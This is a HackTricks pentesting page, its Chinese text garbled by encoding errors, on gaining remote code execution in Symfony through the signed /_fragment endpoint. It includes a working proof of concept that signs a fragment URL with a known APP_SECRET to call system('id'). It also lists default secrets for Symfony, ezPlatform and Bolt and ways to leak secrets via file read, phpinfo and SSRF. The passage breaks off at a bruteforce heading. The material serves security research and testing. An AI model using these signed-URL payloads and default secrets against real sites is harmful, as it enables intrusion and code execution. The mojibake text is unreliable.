# Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ä»‹ç» <a href="#introduction" id="introduction"></a>

è‡ª2008å¹´åˆ›å»ºä»¥æ¥ï¼ŒåŸºäºPHPçš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨[Symfony](https://symfony.com)æ¡†æ¶çš„ä½¿ç”¨è¶Šæ¥è¶Šå¤šã€‚å®ƒç°åœ¨æ˜¯è®¸å¤šçŸ¥åCMSçš„æ ¸å¿ƒç»„ä»¶ï¼Œä¾‹å¦‚[Drupal](https://www.drupal.org)ï¼Œ[Joomlaï¼](https://www.joomla.org)ï¼Œ[eZPlatform](https://ezplatform.com)ï¼ˆä»¥å‰æ˜¯eZPublishï¼‰æˆ–[Bolt](https://bolt.cm)ï¼Œå¹¶ä¸”ç»å¸¸ç”¨äºæ„å»ºè‡ªå®šä¹‰ç½‘ç«™ã€‚

Symfonyçš„ä¸€ä¸ªå†…ç½®åŠŸèƒ½ï¼Œç”¨äºå¤„ç†[ESIï¼ˆè¾¹ç¼˜åŒ…å«ï¼‰](https://en.wikipedia.org/wiki/Edge\_Side\_Includes)ï¼Œæ˜¯[`FragmentListener`ç±»](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php)ã€‚åŸºæœ¬ä¸Šï¼Œå½“æœ‰äººå‘å‡ºå¯¹`/_fragment`çš„è¯·æ±‚æ—¶ï¼Œæ­¤ä¾¦å¬å™¨ä¼šä»ç»™å®šçš„GETå‚æ•°è®¾ç½®è¯·æ±‚å±æ€§ã€‚ç”±äºè¿™å…è®¸**è¿è¡Œä»»æ„PHPä»£ç **ï¼ˆç¨åè¯¦ç»†ä»‹ç»ï¼‰ï¼Œè¯·æ±‚å¿…é¡»ä½¿ç”¨HMACå€¼è¿›è¡Œç­¾åã€‚æ­¤HMACçš„ç§˜å¯†åŠ å¯†å¯†é’¥å­˜å‚¨åœ¨åä¸º`secret`çš„Symfonyé…ç½®å€¼ä¸‹ã€‚

è¿™ä¸ªé…ç½®å€¼`secret`ä¹Ÿè¢«ç”¨äºæ„å»ºCSRFä»¤ç‰Œå’Œè®°ä½æˆ‘ä»¤ç‰Œã€‚é‰´äºå…¶é‡è¦æ€§ï¼Œè¿™ä¸ªå€¼æ˜¾ç„¶å¿…é¡»éå¸¸éšæœºã€‚

ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬å‘ç°ç§˜å¯†é€šå¸¸è¦ä¹ˆæœ‰ä¸€ä¸ª**é»˜è®¤å€¼**ï¼Œè¦ä¹ˆå­˜åœ¨**è·å–è¯¥å€¼çš„æ–¹æ³•ï¼Œç¦»çº¿æš´åŠ›ç ´è§£å®ƒï¼Œæˆ–è€…çº¯ç²¹ç»•è¿‡ä¸å…¶ç›¸å…³çš„å®‰å…¨æ£€æŸ¥**ã€‚å®ƒä¸»è¦å½±å“Boltï¼ŒeZPlatformå’ŒeZPublishã€‚

å°½ç®¡è¿™å¯èƒ½çœ‹èµ·æ¥åƒä¸€ä¸ªæ— å®³çš„é…ç½®é—®é¢˜ï¼Œä½†æˆ‘ä»¬å‘ç°åœ¨ä¸Šè¿°CMSä»¥åŠè‡ªå®šä¹‰åº”ç”¨ç¨‹åºä¸­ï¼Œ**é»˜è®¤å€¼ã€å¯æš´åŠ›ç ´è§£æˆ–å¯çŒœæµ‹çš„å€¼éå¸¸éå¸¸å¸¸è§**ã€‚è¿™ä¸»è¦æ˜¯ç”±äºåœ¨æ–‡æ¡£æˆ–å®‰è£…æŒ‡å—ä¸­æ²¡æœ‰è¶³å¤Ÿå¼ºè°ƒå…¶é‡è¦æ€§ã€‚

æ­¤å¤–ï¼Œæ”»å‡»è€…å¯ä»¥å°†å½±å“è¾ƒå°çš„æ¼æ´å‡çº§ä¸ºè¯»å–`secret`ï¼ˆé€šè¿‡æ–‡ä»¶æ³„éœ²ï¼‰ï¼Œç»•è¿‡`/_fragment`ç­¾åè¿‡ç¨‹ï¼ˆä½¿ç”¨SSRFï¼‰ç”šè‡³é€šè¿‡`phpinfo()`æ³„éœ²å®ƒï¼

åœ¨æœ¬åšæ–‡ä¸­ï¼Œæˆ‘ä»¬å°†æè¿°å¦‚ä½•åœ¨å„ç§CMSå’ŒåŸºç¡€æ¡†æ¶ä¸­è·å–ç§˜å¯†ï¼Œå¹¶å¦‚ä½•ä½¿ç”¨è¯¥ç§˜å¯†æ‰§è¡Œä»£ç ã€‚

## ä¸€ç‚¹å†å² <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

ä½œä¸ºä¸€ä¸ªç°ä»£åŒ–çš„æ¡†æ¶ï¼ŒSymfonyä»åˆ›å»ºåˆ°ç°åœ¨ä¸€ç›´åœ¨å¤„ç†ç”Ÿæˆè¯·æ±‚çš„å­éƒ¨åˆ†ã€‚åœ¨`/_fragment`ä¹‹å‰ï¼Œæœ‰`/_internal`å’Œ`/_proxy`ï¼Œå®ƒä»¬æœ¬è´¨ä¸Šæ˜¯åšåŒæ ·çš„äº‹æƒ…ã€‚å¤šå¹´æ¥ï¼Œå®ƒäº§ç”Ÿäº†è®¸å¤šæ¼æ´ï¼š[CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes)ï¼Œ[CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy)å’Œ[CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access)ç­‰ã€‚

è‡ªSymfony 4ä»¥æ¥ï¼Œå®‰è£…æ—¶ä¼šç”Ÿæˆç§˜å¯†ï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨`/_fragment`é¡µé¢ã€‚å› æ­¤ï¼Œäººä»¬å¯èƒ½è®¤ä¸ºï¼Œæ—¢æœ‰å¼±`secret`ï¼Œåˆå¯ç”¨`/_fragment`çš„æƒ…å†µå¾ˆå°‘è§ã€‚ä½†äº‹å®å¹¶éå¦‚æ­¤ï¼šè®¸å¤šæ¡†æ¶ä¾èµ–äºæ—§çš„Symfonyç‰ˆæœ¬ï¼ˆç”šè‡³2.xä»ç„¶éå¸¸å¸¸è§ï¼‰ï¼Œå¹¶ä¸”å®ç°äº†é™æ€`secret`å€¼æˆ–ç”Ÿæˆä¸è‰¯çš„å€¼ã€‚æ­¤å¤–ï¼Œè®¸å¤šä¾èµ–äºESIï¼Œå› æ­¤å¯ç”¨äº†`/_fragment`é¡µé¢ã€‚æ­¤å¤–ï¼Œæ­£å¦‚æˆ‘ä»¬å°†çœ‹åˆ°çš„ï¼Œå…¶ä»–å½±å“è¾ƒå°çš„æ¼æ´ä¹Ÿå¯ä»¥å…è®¸è½¬å‚¨ç§˜å¯†ï¼Œå³ä½¿å®ƒå·²ç»è¢«å®‰å…¨åœ°ç”Ÿæˆã€‚

## ä½¿ç”¨`secret`æ‰§è¡Œä»£ç  <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

æˆ‘ä»¬é¦–å…ˆæ¼”ç¤ºäº†ä¸€ä¸ªæ”»å‡»è€…å¦‚ä½•åœ¨äº†è§£`secret`é…ç½®å€¼çš„æƒ…å†µä¸‹è·å–ä»£ç æ‰§è¡Œã€‚è¿™æ˜¯é’ˆå¯¹æœ€æ–°çš„`symfony/http-kernel`ç‰ˆæœ¬è¿›è¡Œçš„ï¼Œä½†å¯¹å…¶ä»–ç‰ˆæœ¬ä¹Ÿç±»ä¼¼ã€‚
### ä½¿ç”¨ `/_fragment` è¿è¡Œä»»æ„ä»£ç  <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ `/_fragment` é¡µé¢ã€‚
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest`ä¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¸Šè¿è¡Œï¼šå¦‚æœè¯·æ±‚çš„è·¯å¾„æ˜¯`/_fragment`[1]ï¼Œè¯¥æ–¹æ³•é¦–å…ˆä¼šæ£€æŸ¥è¯·æ±‚æ˜¯å¦æœ‰æ•ˆï¼ˆå³æ˜¯å¦æ­£ç¡®ç­¾åï¼‰ï¼Œå¦åˆ™ä¼šå¼•å‘å¼‚å¸¸[2]ã€‚å¦‚æœå®‰å…¨æ£€æŸ¥æˆåŠŸï¼Œå®ƒå°†è§£æurlç¼–ç çš„`_path`å‚æ•°ï¼Œå¹¶ç›¸åº”åœ°è®¾ç½®`$request`å±æ€§ã€‚

è¯·æ±‚å±æ€§ä¸åº”ä¸HTTPè¯·æ±‚å‚æ•°æ··æ·†ï¼šå®ƒä»¬æ˜¯Symfonyç»´æŠ¤çš„å†…éƒ¨å€¼ï¼Œé€šå¸¸ä¸èƒ½ç”±ç”¨æˆ·æŒ‡å®šã€‚å…¶ä¸­ä¸€ä¸ªè¯·æ±‚å±æ€§æ˜¯`_controller`ï¼Œå®ƒæŒ‡å®šè¦è°ƒç”¨çš„Symfonyæ§åˆ¶å™¨ï¼ˆä¸€ä¸ªï¼ˆç±»ï¼Œæ–¹æ³•ï¼‰å…ƒç»„ï¼Œæˆ–è€…åªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼‰ã€‚åç§°ä¸ä»¥`_`å¼€å¤´çš„å±æ€§æ˜¯è¦ä¼ é€’ç»™æ§åˆ¶å™¨çš„å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼š
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
æˆ‘ä»¬å°†`_path`è®¾ç½®ä¸ºï¼š

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

ç„¶åè¯·æ±‚å°†å¦‚ä¸‹æ‰€ç¤ºï¼š

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

åŸºæœ¬ä¸Šï¼Œè¿™å…è®¸è°ƒç”¨ä»»ä½•å‡½æ•°æˆ–ä»»ä½•ç±»çš„ä»»ä½•æ–¹æ³•ï¼Œä»¥åŠä»»ä½•å‚æ•°ã€‚é‰´äºSymfonyæ‹¥æœ‰ä¼—å¤šçš„ç±»ï¼Œ**è·å–ä»£ç æ‰§è¡Œæ˜¯å¾®ä¸è¶³é“çš„**ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨`system()`ï¼š

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_æ¯æ¬¡è°ƒç”¨systemå¹¶ä¸æ€»æ˜¯æœ‰æ•ˆï¼šæœ‰å…³åˆ©ç”¨ç»†èŠ‚ï¼Œè¯·å‚è€ƒExploitéƒ¨åˆ†ã€‚_

ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šSymfonyå¦‚ä½•éªŒè¯è¯·æ±‚çš„ç­¾åï¼Ÿ

### å¯¹URLè¿›è¡Œç­¾å <a href="#signing-the-url" id="signing-the-url"></a>

ä¸ºäº†éªŒè¯URLçš„ç­¾åï¼Œä¼šå¯¹_å®Œæ•´çš„_ URLè®¡ç®—HMACã€‚ç„¶åå°†å¾—åˆ°çš„å“ˆå¸Œä¸ç”¨æˆ·æŒ‡å®šçš„å“ˆå¸Œè¿›è¡Œæ¯”è¾ƒã€‚

åœ¨ä»£ç ä¸Šï¼Œè¿™æ˜¯åœ¨ä¸¤ä¸ªåœ°æ–¹å®Œæˆçš„ï¼š
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
ç®€è€Œè¨€ä¹‹ï¼ŒSymfonyæå–`_hash` GETå‚æ•°ï¼Œç„¶åé‡æ„å®Œæ•´çš„URLï¼Œä¾‹å¦‚`https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`ï¼Œä½¿ç”¨`secret`ä½œä¸ºå¯†é’¥\[1]å¯¹è¯¥URLè¿›è¡ŒHMACè®¡ç®—ï¼Œå¹¶å°†å…¶ä¸ç»™å®šçš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒ\[2]ã€‚å¦‚æœå®ƒä»¬ä¸åŒ¹é…ï¼Œåˆ™ä¼šå¼•å‘`AccessDeniedHttpException`å¼‚å¸¸\[3]ï¼Œå¯¼è‡´`403`é”™è¯¯ã€‚

### ç¤ºä¾‹ <a href="#example" id="example"></a>

ä¸ºäº†æµ‹è¯•è¿™ä¸ªï¼Œè®©æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¹¶æå–å¯†é’¥ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ˜¯éšæœºç”Ÿæˆçš„ï¼‰ã€‚
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
ç°åœ¨ï¼Œè®¿é—®`http://localhost:8000/_fragment`ä¼šè¿”å›`403`é”™è¯¯ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„ç­¾åï¼š
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
é€šè¿‡æ£€æŸ¥ `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`ï¼Œæˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†ä¸€ä¸ª `404` çŠ¶æ€ç ã€‚ç­¾åæ˜¯æ­£ç¡®çš„ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æŒ‡å®šä»»ä½•è¯·æ±‚å±æ€§ï¼Œæ‰€ä»¥Symfonyæ‰¾ä¸åˆ°æˆ‘ä»¬çš„æ§åˆ¶å™¨ã€‚

ç”±äºæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»ä½•æ–¹æ³•ï¼Œä½¿ç”¨ä»»ä½•å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© `system($command, $return_value)`ï¼Œå¹¶æä¾›å¦‚ä¸‹æœ‰æ•ˆè½½è·ï¼š
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
æˆ‘ä»¬ç°åœ¨å¯ä»¥è®¿é—®åˆ©ç”¨URLï¼š`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`ã€‚

å°½ç®¡å‡ºç°äº†`500`é”™è¯¯ï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°**æˆ‘ä»¬çš„å‘½ä»¤å·²ç»æ‰§è¡Œ**ã€‚

ä½¿ç”¨ç‰‡æ®µè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## æŸ¥æ‰¾ç§˜å¯† <a href="#finding-secrets" id="finding-secrets"></a>

å†æ¬¡å¼ºè°ƒï¼šå¦‚æœæ— æ³•è·å–ç§˜å¯†ï¼Œæ‰€æœ‰è¿™äº›éƒ½æ²¡æœ‰æ„ä¹‰ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ç§˜å¯†ã€‚æˆ‘ä»¬å°†æè¿°å‡ ç§åœ¨æ²¡æœ‰ä»»ä½•å…ˆå‰çŸ¥è¯†çš„æƒ…å†µä¸‹è·å–ä»£ç æ‰§è¡Œçš„æ–¹æ³•ã€‚

### é€šè¿‡æ¼æ´ <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

è®©æˆ‘ä»¬ä»æ˜æ˜¾çš„æ¼æ´å¼€å§‹ï¼Œä½¿ç”¨ä½å½±å“çš„æ¼æ´æ¥è·å–ç§˜å¯†ã€‚

#### æ–‡ä»¶è¯»å– <a href="#file-read" id="file-read"></a>

æ˜¾ç„¶ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶è¯»å–æ¼æ´æ¥è¯»å–ä»¥ä¸‹æ–‡ä»¶å¹¶è·å–`secret`ï¼š

* `app/config/parameters.yml`
* `.env`

_ä¾‹å¦‚ï¼Œä¸€äº›Symfonyè°ƒè¯•å·¥å…·æ å…è®¸æ‚¨è¯»å–æ–‡ä»¶ã€‚_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

åœ¨æœ€æ–°çš„Symfonyç‰ˆæœ¬ï¼ˆ3.xï¼‰ä¸­ï¼Œ`secret`å­˜å‚¨åœ¨`.env`ä¸­ä½œä¸º`APP_SECRET`ã€‚ç”±äºå®ƒè¢«å¯¼å…¥ä¸ºç¯å¢ƒå˜é‡ï¼Œå¯ä»¥é€šè¿‡`phpinfo()`é¡µé¢æŸ¥çœ‹å®ƒä»¬ã€‚

_é€šè¿‡phpinfoæ³„éœ²APP\_SECRET_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

å¯ä»¥é€šè¿‡Symfonyçš„åˆ†æå™¨åŒ…æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œå¦‚å±å¹•æˆªå›¾æ‰€ç¤ºã€‚

#### SSRF / IPæ¬ºéª—ï¼ˆCVE-2014-5245ï¼‰ <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener`èƒŒåçš„ä»£ç åœ¨å¤šå¹´é—´å‘ç”Ÿäº†å˜åŒ–ï¼šåœ¨ç‰ˆæœ¬_2.5.3_ä¹‹å‰ï¼Œå½“è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„ä»£ç†ï¼ˆå³`localhost`ï¼‰æ—¶ï¼Œå®ƒå°†è¢«è§†ä¸ºå®‰å…¨çš„ï¼Œå› æ­¤ä¸ä¼šæ£€æŸ¥å“ˆå¸Œå€¼ã€‚ä¾‹å¦‚ï¼ŒSSRFå¯ä»¥å…è®¸ç«‹å³è¿è¡Œä»£ç ï¼Œè€Œä¸ç®¡æ˜¯å¦æœ‰`secret`ã€‚è¿™ä¸»è¦å½±å“eZPublishç›´åˆ°2014.7ç‰ˆæœ¬ã€‚
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
è¯šç„¶ï¼Œæ‰€æœ‰è¿™äº›æŠ€æœ¯éƒ½éœ€è¦å¦ä¸€ä¸ªæ¼æ´ã€‚è®©æˆ‘ä»¬æ·±å…¥ç ”ç©¶ä¸€ä¸ªæ›´å¥½çš„å‘é‡ï¼šé»˜è®¤å€¼ã€‚

### é€šè¿‡é»˜è®¤å€¼ <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

åœ¨è®¾ç½®Symfonyç½‘ç«™æ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯å®‰è£…[symfony-standard](https://github.com/symfony/symfony-standard)éª¨æ¶ã€‚å®‰è£…å®Œæˆåï¼Œä¼šæç¤ºè¾“å…¥ä¸€äº›é…ç½®å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯†é’¥æ˜¯`ThisTokenIsNotSoSecretChangeIt`ã€‚

_Symfonyé€šè¿‡composerè¿›è¡Œå®‰è£…_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

åœ¨åç»­ç‰ˆæœ¬ï¼ˆ4+ï¼‰ä¸­ï¼Œå¯†é’¥ä¼šè¢«å®‰å…¨åœ°ç”Ÿæˆã€‚

#### ezPlatform 3.xï¼ˆæœ€æ–°ç‰ˆï¼‰ï¼š`ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com)æ˜¯[ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish)çš„ç»§ä»»è€…ï¼Œä»ç„¶ä½¿ç”¨Symfonyã€‚åœ¨2019å¹´6æœˆ10æ—¥ï¼Œä¸€æ¬¡[æäº¤](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59)å°†é»˜è®¤å¯†é’¥è®¾ç½®ä¸º`ff6dc61a329dc96652bb092ec58981f7`ã€‚å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»3.0-alpha1åˆ°3.1.1ï¼ˆå½“å‰ç‰ˆæœ¬ï¼‰ã€‚

å°½ç®¡[æ–‡æ¡£](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters)æŒ‡å‡ºåº”è¯¥æ›´æ”¹å¯†é’¥ï¼Œä½†å¹¶æ²¡æœ‰å¼ºåˆ¶æ‰§è¡Œã€‚

#### ezPlatform 2.xï¼š`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

ä¸Symfonyçš„éª¨æ¶ç±»ä¼¼ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¼šæç¤ºæ‚¨è¾“å…¥ä¸€ä¸ªå¯†é’¥ã€‚é»˜è®¤å€¼ä¸º`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`ã€‚

#### Bolt CMS <= 3.7ï¼ˆæœ€æ–°ç‰ˆï¼‰ï¼š`md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm)ä½¿ç”¨[Silex](https://github.com/silexphp/Silex)ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºSymfonyçš„å·²å¼ƒç”¨çš„å¾®æ¡†æ¶ã€‚å®ƒä½¿ç”¨ä»¥ä¸‹è®¡ç®—æ¥è®¾ç½®å¯†é’¥ï¼š
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
å› æ­¤ï¼Œå¯ä»¥çŒœæµ‹ç§˜å¯†ï¼Œæˆ–ä½¿ç”¨å®Œæ•´è·¯å¾„æ³„éœ²æ¼æ´æ¥è®¡ç®—å®ƒã€‚

å¦‚æœä½¿ç”¨é»˜è®¤çš„ç§˜å¯†å¯†é’¥æ²¡æœ‰æˆåŠŸï¼Œä¸è¦ç»æœ›ï¼šè¿˜æœ‰å…¶ä»–æ–¹æ³•ã€‚

### æš´åŠ›ç ´è§£ <a href="#bruteforce" id="bruteforce"></a>

